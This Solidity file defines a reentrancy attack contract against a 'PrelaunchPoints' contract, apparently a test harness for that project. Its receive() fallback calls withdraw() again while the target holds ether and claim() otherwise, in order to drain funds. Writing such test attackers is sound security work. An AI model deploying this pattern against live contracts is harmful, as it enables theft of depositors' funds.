// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../src/PrelaunchPoints.sol";

contract AttackContract {
    PrelaunchPoints public prelaunchPoints;

    constructor(PrelaunchPoints _prelaunchPoints) {
        prelaunchPoints = _prelaunchPoints;
    }

    function attackWithdraw() external {
        prelaunchPoints.withdraw();
    }

    function attackClaim() external {
        prelaunchPoints.claim();
    }

    receive() external payable {
        if (address(prelaunchPoints).balance > 0) {
            prelaunchPoints.withdraw();
        } else {
            prelaunchPoints.claim();
        }
    }
}
